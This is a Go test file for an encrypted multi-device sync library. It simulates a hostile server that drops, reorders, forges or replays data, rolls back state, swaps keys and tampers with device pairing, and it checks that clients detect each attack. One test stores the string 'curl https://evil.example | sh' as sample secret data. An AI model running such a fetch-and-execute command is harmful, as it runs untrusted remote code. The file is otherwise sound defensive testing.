package komandosync

import (
	"bytes"
	"errors"
	"fmt"
	"slices"
	"strings"
	"testing"
)

// scene is the start of every attack: A and B synced, then A wrote three
// more records and synced, B has not seen them yet. C is on the list too.
type scene struct {
	w       *world
	a, b, c *Device
	kit     *Kit
	ids     []RecordID
}

func newScene(t *testing.T) *scene {
	w := newWorld(t)
	a, kit := w.account("MacBook")
	b := w.pair(a, "iPhone", true)
	c := w.pair(a, "iPad", true)
	s := &scene{w: w, a: a, b: b, c: c, kit: kit}
	for i := range 2 {
		id, err := a.Create(TypeServer, field("name", fmt.Sprint("old", i)), field("address", "10.0.0.1"))
		must(t, err)
		s.ids = append(s.ids, id)
	}
	w.syncAll(a, b, c)
	for i := range 3 {
		id, err := a.Create(TypeServer, field("name", fmt.Sprint("new", i)), field("address", "10.0.0.2"))
		must(t, err)
		s.ids = append(s.ids, id)
	}
	_, err := a.Sync()
	must(t, err)
	return s
}

// forB applies f to what B reads from one log, and leaves others alone.
func (s *scene) forB(log string, f func([][]byte) [][]byte) {
	s.w.srv.OnRead = func(by DeviceID, l string, items [][]byte) [][]byte {
		if by == s.b.ID() && l == log {
			return f(items)
		}
		return items
	}
}

func TestHostileServerIsDetected(t *testing.T) {
	cases := []struct {
		name   string
		attack func(t *testing.T, s *scene)
		want   error
	}{
		{"drop a write in the middle", func(t *testing.T, s *scene) {
			s.forB(logWrites(s.a.ID()), func(it [][]byte) [][]byte { return slices.Delete(it, len(it)-2, len(it)-1) })
		}, ErrMissingWrites},
		{"drop the newest write (hide a record)", func(t *testing.T, s *scene) {
			s.forB(logWrites(s.a.ID()), func(it [][]byte) [][]byte { return it[:len(it)-1] })
		}, ErrMissingWrites},
		{"hide a deletion marker", func(t *testing.T, s *scene) {
			_, err := s.a.Delete(s.ids[0])
			must(t, err)
			_, err = s.a.Sync()
			must(t, err)
			s.forB(logWrites(s.a.ID()), func(it [][]byte) [][]byte { return slices.Delete(it, len(it)-2, len(it)-1) })
		}, ErrMissingWrites},
		{"reorder writes", func(t *testing.T, s *scene) {
			s.forB(logWrites(s.a.ID()), func(it [][]byte) [][]byte {
				n := len(it)
				it[n-1], it[n-2] = it[n-2], it[n-1]
				return it
			})
		}, ErrMissingWrites},
		{"move a write into another device's log", func(t *testing.T, s *scene) {
			s.forB(logWrites(s.c.ID()), func(it [][]byte) [][]byte {
				aw, _ := s.w.srv.MemServer.Read(s.a.ID(), logWrites(s.a.ID()))
				return append(it, aw[0])
			})
		}, ErrBadWrite},
		{"a second, different write 1 (a stolen sync key)", func(t *testing.T, s *scene) {
			s.forB(logWrites(s.a.ID()), func(it [][]byte) [][]byte {
				w, _ := ParseWrite(it[0])
				w.Body.CT = clone(w.Body.CT)
				w.Body.CT[0] ^= 1
				w.Sig, _ = sign(s.a.keys.Sync, labelWrite, w.signedBytes())
				it[0] = w.Marshal()
				return it
			})
		}, ErrFork},
		{"forge a write with the server's own key", func(t *testing.T, s *scene) {
			s.forB(logWrites(s.a.ID()), func(it [][]byte) [][]byte {
				w, _ := ParseWrite(it[len(it)-1])
				k := mustSigner(t)
				w.Sig, _ = sign(k, labelWrite, w.signedBytes())
				it[len(it)-1] = w.Marshal()
				return it
			})
		}, ErrBadSignature},
		{"flip one bit of a sealed body", func(t *testing.T, s *scene) {
			s.forB(logWrites(s.a.ID()), func(it [][]byte) [][]byte {
				last := clone(it[len(it)-1])
				last[len(last)-80] ^= 1
				it[len(it)-1] = last
				return it
			})
		}, ErrBadSignature},
		{"roll the whole server back", func(t *testing.T, s *scene) {
			snap := s.w.srv.Snapshot()
			_, err := s.b.Sync()
			must(t, err)
			s.w.srv.Restore(snap)
			// B wrote nothing yet, so its own log is empty in both: the
			// summaries give it away.
		}, ErrRollback},
		{"roll the list back (undo a removal)", func(t *testing.T, s *scene) {
			old, _ := s.w.srv.MemServer.Read(s.a.ID(), logList)
			must(t, s.a.Remove(s.c.ID()))
			_, err := s.b.Sync()
			must(t, err)
			s.forB(logList, func([][]byte) [][]byte { return old })
		}, ErrRollback},
		{"fork: hide a removal from one device", func(t *testing.T, s *scene) {
			old, _ := s.w.srv.MemServer.Read(s.a.ID(), logList)
			must(t, s.a.Remove(s.c.ID()))
			_, err := s.a.Sync()
			must(t, err)
			s.forB(logList, func([][]byte) [][]byte { return old })
		}, ErrListBehind},
		{"fork: show another account's list", func(t *testing.T, s *scene) {
			other := newWorld(t)
			x, _ := other.account("X")
			list, _ := other.srv.MemServer.Read(x.ID(), logList)
			s.forB(logList, func([][]byte) [][]byte { return list })
		}, ErrAccountMismatch},
		{"substitute a list entry: new device signed by itself", func(t *testing.T, s *scene) {
			s.forB(logList, func(it [][]byte) [][]byte {
				ev := s.w.device("evil", true)
				en := &Entry{Num: uint32(len(it) + 1), Prev: mustEntry(t, it[len(it)-1]).Hash(),
					Body: Body{Action: ActAddDevice, Devices: []DeviceRecord{ev.rec}}}
				en.Sigs, _ = joinSigs(ev.keys, &ev.rec, 0)
				must(t, en.signEntry(ev.keys.Authority, RoleAuthority, ev.ID(), 0))
				return append(it, en.Marshal())
			})
		}, ErrNotAuthorized},
		{"substitute a list entry: change it, keep the signatures", func(t *testing.T, s *scene) {
			s.forB(logList, func(it [][]byte) [][]byte {
				en := mustEntry(t, it[len(it)-1])
				ev := s.w.device("evil", true)
				en.Body.Devices[0] = ev.rec
				it[len(it)-1] = en.Marshal()
				return it
			})
		}, ErrNotAuthorized},
		{"replay an old list entry", func(t *testing.T, s *scene) {
			s.forB(logList, func(it [][]byte) [][]byte { return append(it, it[1]) })
		}, ErrChainBroken},
		{"reorder list entries", func(t *testing.T, s *scene) {
			s.forB(logList, func(it [][]byte) [][]byte { it[1], it[2] = it[2], it[1]; return it })
		}, ErrChainBroken},
		{"pass off one device's summary as another's", func(t *testing.T, s *scene) {
			s.c.sumNum[s.c.ID()] += 100
			must(t, s.c.publishSummary()) // C's newest now has the higher number
			cs, _ := s.w.srv.MemServer.Read(s.c.ID(), logSummaries(s.c.ID()))
			s.forB(logSummaries(s.a.ID()), func(it [][]byte) [][]byte { return append(it, cs[len(cs)-1]) })
		}, ErrBadSignature},
		{"raise a summary's number", func(t *testing.T, s *scene) {
			s.forB(logSummaries(s.a.ID()), func(it [][]byte) [][]byte {
				sm, _ := ParseSummary(it[len(it)-1])
				sm.Num += 5
				return append(it, sm.Marshal())
			})
		}, ErrBadSignature},
		{"hand over another device's sealed key", func(t *testing.T, s *scene) {
			must(t, s.a.Remove(s.c.ID()))
			g := s.a.List().Gen
			s.w.srv.OnGet = func(by DeviceID, name string, data []byte) []byte {
				if by == s.b.ID() && name == blobDeviceKey(g.KeyID, s.b.ID()) {
					b, _ := s.w.srv.MemServer.Get(by, blobDeviceKey(g.KeyID, s.a.ID()))
					return b
				}
				return data
			}
		}, ErrNoKey},
		{"hand over a key the server made", func(t *testing.T, s *scene) {
			must(t, s.a.Remove(s.c.ID()))
			g := s.a.List().Gen
			s.w.srv.OnGet = func(by DeviceID, name string, data []byte) []byte {
				if by == s.b.ID() && name == blobDeviceKey(g.KeyID, s.b.ID()) {
					ct, _ := sealTo(s.b.rec.UnwrapPub, infoDevice(s.b.Account(), g.Gen, s.b.ID()), randomBytes(32))
					return ct
				}
				return data
			}
		}, ErrKeyMismatch},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			s := newScene(t)
			before := s.b.Records()
			c.attack(t, s)
			_, err := s.b.Sync()
			wantErr(t, err, c.want)
			if c.want != ErrRollback && s.b.Records() != before {
				t.Fatalf("B changed its data after a failed check: %d -> %d records", before, s.b.Records())
			}
		})
	}
}

func mustEntry(t *testing.T, b []byte) *Entry {
	en, err := ParseEntry(b)
	must(t, err)
	return en
}

func TestReplayedWritesAreIgnoredAndCounted(t *testing.T) {
	s := newScene(t)
	s.forB(logWrites(s.a.ID()), func(it [][]byte) [][]byte { return append(it, it[0], it[1]) })
	rep, err := s.b.Sync()
	must(t, err)
	if rep.Duplicates != 2 {
		t.Fatalf("duplicates = %d", rep.Duplicates)
	}
	if s.b.Records() != s.a.Records() {
		t.Fatalf("records %d vs %d", s.b.Records(), s.a.Records())
	}
}

// Holding back everything one device wrote, its summaries included, cannot
// be seen by the other device alone. Comparing summaries side by side
// (a QR code) catches it (SS 9).
func TestHoldingBackIsCaughtSideBySide(t *testing.T) {
	s := newScene(t)
	aw, _ := s.w.srv.MemServer.Read(s.a.ID(), logWrites(s.a.ID()))
	as, _ := s.w.srv.MemServer.Read(s.a.ID(), logSummaries(s.a.ID()))
	cut := len(aw) - 3
	s.w.srv.OnRead = func(by DeviceID, l string, items [][]byte) [][]byte {
		switch {
		case by != s.b.ID():
			return items
		case l == logWrites(s.a.ID()):
			return items[:cut]
		case l == logSummaries(s.a.ID()):
			return items[:len(as)-1]
		}
		return items
	}
	_, err := s.b.Sync()
	must(t, err) // the server got away with it, for now
	wantErr(t, s.b.CheckPeer(s.a.SummaryCode()), ErrMissingWrites)
	_, err = s.b.Sync()
	wantErr(t, err, ErrMissingWrites) // and sync stays stopped until fixed
	s.w.srv.OnRead = nil
	_, err = s.b.Sync()
	must(t, err)
}

// The server must never hold a plaintext or a key: run a whole life of an
// account and search everything it stores.
func TestServerNeverSeesPlaintextOrKeys(t *testing.T) {
	w := newWorld(t)
	a, kit := w.account("Budi's MacBook")
	b := w.pair(a, "Budi's iPhone", true)
	c := w.pair(b, "Budi's iPad", true)
	secrets := []string{"prod-db.internal.example", "s3cr3t-Pa55w0rd-xyz", "curl https://evil.example | sh"}
	id, err := a.Create(TypeServer, field("name", "prod-db-main"), field("address", secrets[0]))
	must(t, err)
	_, err = b.Create(TypeSecret, field("name", "prod-db-pass"), field("value", secrets[1]))
	must(t, err)
	w.syncAll(a, b, c)
	_, err = c.Update(id, field("command", secrets[2]))
	must(t, err)
	w.syncAll(a, b, c)
	must(t, a.Remove(c.ID()))
	w.syncAll(a, b)

	plain := append(secrets, "Budi's MacBook", "Budi's iPhone", "Budi's iPad", "prod-db-main", "prod-db-pass")
	var keys [][]byte
	keys = append(keys, kit.key[:])
	for _, d := range []*Device{a, b} {
		for gen, k := range d.acctKeys {
			keys = append(keys, k, d.vaultKeys[gen])
		}
	}
	for _, blob := range w.srv.AllBytes() {
		for _, p := range plain {
			if bytes.Contains(blob, []byte(p)) || strings.Contains(strings.ToLower(string(blob)), strings.ToLower(p)) {
				t.Fatalf("server holds plaintext %q", p)
			}
		}
		for _, k := range keys {
			if bytes.Contains(blob, k) {
				t.Fatal("server holds a key")
			}
		}
	}
}

func TestPairingAgainstHostileServer(t *testing.T) {
	cases := []struct {
		name   string
		attack func(t *testing.T, w *world, j *Joiner, code string, nd *Device)
		atNew  bool // the new device catches it; else the existing one
		want   error
	}{
		{"server swaps the new device's request", func(t *testing.T, w *world, j *Joiner, code string, nd *Device) {
			other := w.device("evil", true)
			_, _, err := StartJoin(other) // a request under some other secret
			must(t, err)
			box := oneTimeBox(randomBytes(32), []byte(labelPairReq), []byte("evil keys"))
			must(t, w.srv.Put(DeviceID{}, mailbox(j.secret)+"/req", box))
		}, false, ErrCheckCode},
		{"server makes up the reply", func(t *testing.T, w *world, j *Joiner, code string, nd *Device) {
			w.srv.OnGet = func(by DeviceID, name string, data []byte) []byte {
				if strings.HasSuffix(name, "/reply") {
					return oneTimeBox(randomBytes(32), []byte(labelPairReply), randomBytes(100))
				}
				return data
			}
		}, true, ErrCheckCode},
		{"server enrols the device into an account it made up", func(t *testing.T, w *world, j *Joiner, code string, nd *Device) {
			other := newWorld(t)
			x, _ := other.account("X")
			list, _ := other.srv.MemServer.Read(x.ID(), logList)
			w.srv.OnRead = func(by DeviceID, l string, items [][]byte) [][]byte {
				if by == nd.ID() && l == logList {
					return list
				}
				return items
			}
		}, true, ErrAccountMismatch},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			w := newWorld(t)
			a, _ := w.account("A")
			nd := w.device("B", true)
			j, code, err := StartJoin(nd)
			must(t, err)
			c.attack(t, w, j, code, nd)
			err = a.AcceptJoin(code, func(string) bool { return true })
			if !c.atNew {
				wantErr(t, err, c.want)
				return
			}
			must(t, err)
			_, err = j.Finish()
			wantErr(t, err, c.want)
		})
	}
}

func TestPairingWindowAndOneTry(t *testing.T) {
	w := newWorld(t)
	a, _ := w.account("A")

	nd := w.device("late", true)
	j, code, err := StartJoin(nd)
	must(t, err)
	w.clk.add(PairingWindow + 1)
	wantErr(t, a.AcceptJoin(code, func(string) bool { return true }), ErrPairingExpired)
	_, err = j.Finish()
	wantErr(t, err, ErrPairingExpired)

	nd2 := w.device("typo", true)
	_, code2, err := StartJoin(nd2)
	must(t, err)
	bad := []byte(code2)
	bad[3] = map[bool]byte{true: 'A', false: 'B'}[bad[3] != 'A']
	wantErr(t, a.AcceptJoin(string(bad), func(string) bool { return true }), ErrCheckCode)

	must(t, a.AcceptJoin(code2, func(string) bool { return true }))
	wantErr(t, a.AcceptJoin(code2, func(string) bool { return true }), ErrCheckCode) // used
	if len(code2) != 26 {
		t.Fatalf("code has %d characters, want 26", len(code2))
	}
	j3, code3, err := StartJoin(w.device("declined", true))
	must(t, err)
	wantErr(t, a.AcceptJoin(code3, func(string) bool { return false }), ErrDeclined)
	_, err = j3.Finish()
	wantErr(t, err, ErrWaiting)
	if errors.Is(err, ErrPairingUsed) {
		t.Fatal("waiting must not burn the one try")
	}
}
